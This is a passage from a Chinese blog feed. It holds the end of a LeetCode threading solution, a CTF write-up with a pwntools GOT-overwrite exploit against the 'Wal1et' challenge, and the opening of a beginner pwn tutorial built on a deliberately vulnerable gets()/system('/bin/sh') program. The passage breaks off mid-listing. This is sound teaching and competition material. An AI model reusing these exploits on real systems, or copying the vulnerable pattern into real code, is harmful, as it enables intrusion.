class="title">ZeroEvenOdd</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.sem_zero = Semaphore(<span class="number">1</span>)</span><br><span class="line">        self.sem_odd = Semaphore(<span class="number">0</span>)</span><br><span class="line">        self.sem_even = Semaphore(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment"># printNumber(x) outputs "x", where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">zero</span><span class="params">(self, printNumber: <span class="string">'Callable[[int], None]'</span>)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,self.n):</span><br><span class="line">            self.sem_zero.acquire()</span><br><span class="line">            printNumber(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                self.sem_odd.release()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.sem_even.release()</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">even</span><span class="params">(self, printNumber: <span class="string">'Callable[[int], None]'</span>)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,self.n+<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">            self.sem_even.acquire()</span><br><span class="line">            printNumber(i)</span><br><span class="line">            self.sem_zero.release()</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">odd</span><span class="params">(self, printNumber: <span class="string">'Callable[[int], None]'</span>)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.n+<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">            self.sem_odd.acquire()</span><br><span class="line">            printNumber(i)</span><br><span class="line">            self.sem_zero.release()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/04/TN1IJ3p8zvYfQV9.png" alt="image.png"></p><h3 id="解法二：互斥锁-1"><a href="#解法二：互斥锁-1" class="headerlink" title="解法二：互斥锁"></a>解法二：互斥锁</h3><p>依然可以用互斥锁来解决这个问题</p><p>构造代码如下：</p><h4 id="C-版-3"><a href="#C-版-3" class="headerlink" title="C++版"></a>C++版</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZeroEvenOdd</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">std</span>::mutex lock_zero, lock_odd, lock_even;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ZeroEvenOdd(<span class="keyword">int</span> n) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">        lock_zero.unlock();</span><br><span class="line">        lock_odd.lock();</span><br><span class="line">        lock_even.lock();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber(x) outputs "x", where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">zero</span><span class="params">(function&lt;<span class="keyword">void</span>(<span class="keyword">int</span>)&gt; printNumber)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            lock_zero.lock();</span><br><span class="line">            printNumber(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span>)</span><br><span class="line">                lock_even.unlock();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                lock_odd.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">even</span><span class="params">(function&lt;<span class="keyword">void</span>(<span class="keyword">int</span>)&gt; printNumber)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            lock_even.lock();</span><br><span class="line">            printNumber(i);</span><br><span class="line">            lock_zero.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">odd</span><span class="params">(function&lt;<span class="keyword">void</span>(<span class="keyword">int</span>)&gt; printNumber)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            lock_odd.unlock();</span><br><span class="line">            printNumber(i);</span><br><span class="line">            lock_zero.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/04/Vkl13wLKMpEgH98.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;虽然说很久以前已经“学过了“多线程的内容，但是其实还是一知半解XD（其实是一点都不懂多线程（虽然说写过几个简单的多线程的应用小程序（👈那只是Java作业的程度啊喂（👈没有用心学习的屑&lt;/p&gt;
&lt;p&gt;思来想去还是得靠leetcode来巩固基础知识啊（x&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然说题目挺少……&lt;del&gt;不过也凑合凑合刷刷&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;其实盯上的就是题目少的题库&lt;/del&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="题解" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
    <category term="Java" scheme="http://archive.next.arttnba3.cn/tags/Java/"/>
    
    <category term="Python" scheme="http://archive.next.arttnba3.cn/tags/Python/"/>
    
    <category term="多线程" scheme="http://archive.next.arttnba3.cn/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>【CTF题解-0x05】MSSCTF2020-write-up-by-arttnb3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/19/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x05%E3%80%91MSSCTF2020-write-up-by-arttnb3-md/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/19/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x05%E3%80%91MSSCTF2020-write-up-by-arttnb3-md/</id>
    <published>2020-09-19T11:45:24.000Z</published>
    <updated>2020-09-19T19:02:05.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>MSSCTF即<strong>全国中学生网络安全竞赛</strong>，是由西安电子科技大学举办的、面向全国中学生的信息安全竞赛，比赛为采用线上<strong>解题模式</strong>（<strong>Jeopardy</strong>）的CTF</p><p>由于今年疫情原因，比赛全程在线上开办，一心想为学校做贡献（<del>只是想蹭饭</del>）的我也作为志愿者参与了比赛监考的全过程（<del>本来想出题的，但是和中学生巨犇比起来我还是太菜le</del></p><p>以下是我自己的赛后复盘</p><blockquote><p>注：所有的题目环境都已在<a href="https://archive.lctf.online" target="_blank" rel="noopener">archive.lctf.online</a>上有一份</p><p>以及这次mssctf只有一个人做出pwn题，而且还是ak……中学生恐怖如斯……</p></blockquote><a id="more"></a><h1 id="0x01-Pwn"><a href="#0x01-Pwn" class="headerlink" title="0x01.Pwn"></a>0x01.Pwn</h1><h2 id="0x00-Wal1et-got表劫持"><a href="#0x00-Wal1et-got表劫持" class="headerlink" title="0x00.Wal1et - got表劫持"></a>0x00.Wal1et - got表劫持</h2><p><a href="/download/mssctf2020/wallet/Wal1et" title="点击此处下载原题">点击下载-Wal1et</a> </p><p>惯例的<code>checksec</code>，发现开了NX保护和canary</p><p><img src="https://i.loli.net/2020/09/20/WCOR8bqNkMHhjf4.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/09/20/Spw4rA7CvP9LIc5.png" alt="image.png"></p><p>main函数中调用了<code>begin()</code>和<code>check()</code>两个函数，上图我们容易看出<strong>两函数的栈帧的基址应当相同</strong></p><p><img src="https://i.loli.net/2020/09/20/97sjHifVQdlDPEu.png" alt="image.png"></p><p>在<code>begin()</code>函数中可以读入最大108个字节，但是溢出需要至少0x78字节才能覆盖到返回地址，同时该程序也开了canary</p><p><img src="https://i.loli.net/2020/09/20/wlXBaQ3NW9eSqus.png" alt="image.png"></p><p>同样的我们可以看到在<code>check()</code>函数中使用了<code>scanf()</code>，但是没给后面的参数，考虑到可能是真的没有也可能是IDA认不出来，故尝试分析汇编代码</p><p><img src="https://i.loli.net/2020/09/20/TrKLWjF8ualZRcp.png" alt="image.png"></p><p>两次调用<code>scanf()</code>前分别将<code>v1</code>、<code>v2</code>压入栈中，即本质上是<code>scanf(&quot;%d&quot;,v1)</code>与<code>scanf(&quot;%d&quot;,v2)</code>，这里将<code>v1</code>与<code>v2</code>都当成了一个地址并尝试向上面写入数据</p><p>前面我们观察到这两个函数<strong>复用同一个栈空间</strong>，同时在<code>begin()</code>中所读取的字节数量足够覆写<code>check()</code>中的<code>v1</code>，故考虑将v1覆写为后面会调用到的某函数的got表地址，在第一次读入时读入一个可以获得flag的地址，这样会覆写掉got表中原函数的地址；当后面运行到那个函数时，程序会跳转到我们所输入的那个地址上，输出flag，即<strong>got表劫持</strong></p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./Wal1et'</span>)</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">call_sys = <span class="number">0x08048730</span></span><br><span class="line">payload1 = <span class="string">b'a'</span>*<span class="number">104</span>+p32(puts_got)</span><br><span class="line">payload2 = str(call_sys).encode()</span><br><span class="line"></span><br><span class="line">p =process(<span class="string">'./Wal1et'</span>)<span class="comment">#remote('pwn.challenge.lctf.online',10008)</span></span><br><span class="line">p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本即可获得flag</p><p><img src="https://i.loli.net/2020/09/20/CnhPq8QiNGkZH4e.png" alt="image.png"></p><blockquote><p>说实话我是没想到过居然可以这么利用的，🐧yyds</p></blockquote><h2 id="0x01-fishing-master"><a href="#0x01-fishing-master" class="headerlink" title="0x01.fishing master"></a>0x01.fishing master</h2><blockquote><p> 先咕咕咕</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;MSSCTF即&lt;strong&gt;全国中学生网络安全竞赛&lt;/strong&gt;，是由西安电子科技大学举办的、面向全国中学生的信息安全竞赛，比赛为采用线上&lt;strong&gt;解题模式&lt;/strong&gt;（&lt;strong&gt;Jeopardy&lt;/strong&gt;）的CTF&lt;/p&gt;
&lt;p&gt;由于今年疫情原因，比赛全程在线上开办，一心想为学校做贡献（&lt;del&gt;只是想蹭饭&lt;/del&gt;）的我也作为志愿者参与了比赛监考的全过程（&lt;del&gt;本来想出题的，但是和中学生巨犇比起来我还是太菜le&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;以下是我自己的赛后复盘&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：所有的题目环境都已在&lt;a href=&quot;https://archive.lctf.online&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;archive.lctf.online&lt;/a&gt;上有一份&lt;/p&gt;
&lt;p&gt;以及这次mssctf只有一个人做出pwn题，而且还是ak……中学生恐怖如斯……&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="信息安全" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="UAF" scheme="http://archive.next.arttnba3.cn/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>【CTF资料-0x0001】moeCTF2020-Pwn从入门到入狱 by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0001%E3%80%91moeCTF2020-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1%20by%20arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0001%E3%80%91moeCTF2020-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1%20by%20arttnba3/</id>
    <published>2020-09-17T14:19:20.000Z</published>
    <updated>2020-11-28T08:55:34.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwn从入门到入狱"><a href="#Pwn从入门到入狱" class="headerlink" title="Pwn从入门到入狱"></a>Pwn从入门到入狱</h1><p>Copyright © 2020 arttnba3,XDSEC</p><h2 id="简介：什么是Pwn？"><a href="#简介：什么是Pwn？" class="headerlink" title="简介：什么是Pwn？"></a>简介：什么是Pwn？</h2><p><strong>Pwn /poʊn/</strong>这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即<strong>利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权）</strong></p><p>Pwn也是最能代表<strong>原教旨主义黑客</strong>的一个安全研究方向<del>同时也是最容易进监狱的一个方向</del></p><a id="more"></a><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>作为二进制安全的分支之一，Pwn需要你<strong>熟练掌握</strong>如下基础知识：</p><ul><li><strong>主流平台汇编语言，包括但不局限于X86、MIPS等</strong></li><li><strong>C语言</strong></li><li><strong>计算机组成原理</strong></li><li><strong>计算机操作系统</strong></li><li><strong>静态分析（IDA）&amp;动态调试（GDB）</strong></li><li><strong>Python</strong></li><li><strong>编译原理</strong></li><li><strong>……</strong></li></ul><p>看完你可能会感觉有一丶丶头大，不过少有人是先把计科专业本科的内容全部学完才开始学pwn的，大家都是<strong>一边比赛一边学习的</strong>，所以不用担心因为自己0基础导致无法入门的情况的发生</p><blockquote><p>CTF TO LEARN, NOT LEARN TO CTF</p></blockquote><h2 id="Pwn的解题过程？"><a href="#Pwn的解题过程？" class="headerlink" title="Pwn的解题过程？"></a>Pwn的解题过程？</h2><ol><li>题目的二进制文件一般会被部署到服务器上，使用<code>nc xx.xx.xx.xx(ip) xxxx(端口)</code>命令可以与服务器进行交互。并且该二进制文件的副本（与服务器上的完全相同或者基本相同）将作为附件形式被提供给选手下载。</li><li>你需要逆向分析二进制文件副本中存在的可利用漏洞，针对其编写<code>Exploit</code>(漏洞利用脚本)，然后向服务器发起攻击，拿到服务器上保存的<code>flag文件或字符串</code>，将其提交至本平台。</li><li>注意命令行中的<code>nc</code>并不是做题工具，你需要在Linux下安装<code>pwntools</code>库（或者其它），用于编写可用性较高的<code>Exploit</code>。至于如何安装，如何使用，就需要聪明的你发挥自己的学习能力啦~</li></ol><h2 id="0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"><a href="#0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text" class="headerlink" title="0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"></a>0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text</h2><blockquote><h4 id="前置知识要求："><a href="#前置知识要求：" class="headerlink" title="前置知识要求："></a>前置知识要求：</h4><ul><li>C语言基本语法</li><li>Python语言基本语法</li></ul><p>能大致看得懂C程序、有写简单的Python程序的能力即可</p><h4 id="前置环境要求："><a href="#前置环境要求：" class="headerlink" title="前置环境要求："></a>前置环境要求：</h4><ul><li><p>Windows</p></li><li><p>Linux</p></li></ul><p>我们的一部分工作需要在Windows上完成，另一部份工作则需要在Linux中完成</p><p>你可以在windows上运行Linux虚拟机，也可以直接在真机运行linux</p><p>注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢</p><h4 id="百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度"><a href="#百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度" class="headerlink" title="百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度"></a>百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度</h4><h4 id="不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"><a href="#不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称" class="headerlink" title="不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"></a>不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称</h4></blockquote><p>以下内容将通过几个样例简单地帮助你入门Pwn</p><h3 id="以下内容操作环境位于Linux："><a href="#以下内容操作环境位于Linux：" class="headerlink" title="以下内容操作环境位于Linux："></a>以下内容操作环境位于Linux：</h3><p>我们现在来看这样的一个程序：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"tell me your name plz:"</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用<code>-fno-stack-protector</code>、<code>-z norelro</code>、<code>-z execstack</code>、<code>-no-pie</code>这四条编译指令把这个程序的保护都给关掉</p><p><img src="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png" alt="image.png"></p><h4 id="安全检查：checksec"><a href="#安全检查：checksec" class="headerlink" title="安全检查：checksec"></a>安全检查：checksec</h4><p><strong>使用<code>checksec</code>指令可以查看程序的保护开启情况</strong></p><p><img src="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png" alt="image.png"></p><p>可以在控制台输入如下指令安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install checksec</span></span><br></pre></td></tr></table></figure><h4 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h4><p>这个程序做了些什么？</p><ul><li><p>定义了一个后门函数<code>backdoor()</code>，但是并未调用</p></li><li><p>分配了20个字节大小的内存空间给到char类型数组str</p></li><li><p>使用<code>gets()</code>函数从标准输入流读入字符串并写入数组str内</p></li></ul><p>我们可以看到当我们在编译时编译器<strong>给了一个警告</strong>，这是因为<strong>gets()函数并未限制读入的字符的数量，若是用户输入超过20个字符的数据，则会发生栈溢出，轻则会使程序崩溃，重则可能让不法分子获取系统的最高权限</strong></p><p>我们尝试着输入超过20个字节的字符串，看看会发生些什么：</p><p><img src="https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png" alt="image.png"></p><p>程序崩溃，提示<strong>Segmentation fault</strong>（<strong>段错误</strong>），即<strong>该程序尝试访问了不属于他的内存空间</strong></p><p>但是我们的程序执行流程明明很常规，代码里也没有任何的奇怪的操作，<strong>为什么输入不一样就会导致程序崩溃呢？</strong></p><h3 id="以下内容操作环境位于Windows："><a href="#以下内容操作环境位于Windows：" class="headerlink" title="以下内容操作环境位于Windows："></a>以下内容操作环境位于Windows：</h3><h4 id="IDA：逆向分析"><a href="#IDA：逆向分析" class="headerlink" title="IDA：逆向分析"></a>IDA：逆向分析</h4><p>通常情况下，我们所拿到的都是软件的发行版，而不是源代码，我们无法直接看出漏洞存在于哪个地方，故我们需要一个工具来尽可能地还原整个程序的运行过程，这就要借助到一个工具——<strong>IDA</strong></p><p>我们尝试使用<strong>IDA</strong>对程序进行<strong>逆向分析</strong></p><blockquote><p>注：IDA软件本体在moeCTF 2020群内有下载，你也可以选择通过搜索引擎获取一个IDA，或者直接在官网购买正版IDA</p></blockquote><p>当我们将程序拖入IDA后，除了我们自己写的<code>backdoor()</code>函数、<code>func()</code>函数及<code>main()</code>函数之外，我们可以看到IDA还解析出来很多奇奇怪怪的函数，</p><p><img src="https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png" alt="image.png"></p><p>这些预料之外的函数我们目前暂时不需要管（以后会学到的），我们目前只需要分析程序的主逻辑函数即可，双击main函数，我们便可以看到反汇编得到的汇编代码</p><p><img src="https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png" alt="image.png"></p><p>同样地，双击func函数我们也可以看到其原始的汇编代码</p><p><img src="https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png" alt="image.png"></p><blockquote><h3 id="F5键：使用IDA进行逆向分析的神器"><a href="#F5键：使用IDA进行逆向分析的神器" class="headerlink" title="F5键：使用IDA进行逆向分析的神器"></a>F5键：使用IDA进行逆向分析的神器</h3><p>当我们选中一个函数时，我们可以按下F5键，将汇编代码反编译为C语言的代码，使我们能够更好的分析程序执行流程</p><p><img src="https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png" alt="image.png"></p><p>要注意的是<strong>不要完全依赖于F5键进行逆向分析，反编译出来的C语言代码不一定准确、易读，汇编代码的审计与程序的动态调试同样重要</strong></p><p>如：纯汇编编写的程序反编译出来的代码不知所云的情况常常出现</p><p><img src="https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png" alt="image.png"></p><p>如：C++程序很多时候逆出来就是一坨shit，没有强大的代码功底你很难搞明白程序究竟做了些什么，如下图（注释是我以前做这道题的时候手动打上的，可能有错，别深究Or2）</p><p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p></blockquote><p>push是什么？mov是什么？retn又是什么？他们都做了些什么？或许目前对于你而言这是完全陌生的一些东西，不过随着逐步深入的学习，你将会逐渐了解到其含义与作用</p><h3 id="以下内容操作环境位于Linux：-1"><a href="#以下内容操作环境位于Linux：-1" class="headerlink" title="以下内容操作环境位于Linux："></a>以下内容操作环境位于Linux：</h3><h4 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h4><p>为什么这个程序的汇编代码长这个样子？这就涉及到C函数调用的一个比较重要的概念——<strong>栈帧</strong>（<strong>Stack Frame</strong>）</p><blockquote><p>推荐阅读——《程序员的自我修养》第10章</p></blockquote><blockquote><p> 在讲栈帧之前，我们先简单地讲一讲什么是<strong>栈</strong></p><p> 在数据结构中，<strong>栈</strong>（<strong>stack</strong>）是一种受限线性表，在线性表上插入与删除数据的操作都只能在数据表的一端——栈顶进行操作，因此栈也是一种LIFO表（Last-in-First-out）</p><p> 在操作系统中，对动态内存的规划与使用是与数据结构中的栈相似的，我们称之为“栈内存”，用以存储函数内部（包括main函数）的局部变量和方法调用和函数参数值；栈内存是由系统自动分配的，一般速度较快；存储地址是连续且存在有限栈容量，会出现溢出现象程序可以将数据压入栈中，也可以将数据从栈顶弹出。压栈操作使得栈增大，而弹出操作使栈减小。 栈用于维护函数调用的上下文，离开了栈函数调用就没法实现。</p></blockquote><p>当程序每次进行函数调用的时候，都会在调用栈上维护一个独立的<strong>栈帧</strong>，用以储存属于这个函数的数据与基本信息，包括如下信息：</p><ul><li><strong>函数的返回地址和参数</strong></li><li><strong>临时变量: 包括函数的非静态局部变量以及编译器自动生成的其他临时变量</strong></li></ul><p>想象如下一个空的栈：</p><p><strong>需要注意的是：在内存当中，栈是由高地址向低地址方向增长的</strong></p><p><img src="https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png" alt="64E3FCC73EF02703BA8C857A91F96838.png"></p><p>这里引入一个新的概念——<strong>栈指针寄存器SP</strong>（<strong>Stack Pointer</strong>）与<strong>帧指针寄存器BP</strong>（<strong>Frame Pointer</strong>），这两个寄存器用以管理栈帧，其中<strong>SP寄存器永远指向栈顶，BP寄存器用以进行对栈内数据的访问</strong></p><p>当我们要调用一个函数时，首先会先<strong>将下一条的地址压入栈中，作为返回地址，这一步在原函数内完成</strong>，当函数执行流程结束后，程序会通过这个返回地址返回到该函数的上一层的调用地址</p><p>我们还是以刚刚反汇编出来的代码进行分析：</p><p>右键菜单可以切换到文本模式，也可以切换回图标格式，文本模式方便我们得以一窥程序原貌，图标模式则方便我们理解函数内的逻辑</p><p><img src="https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 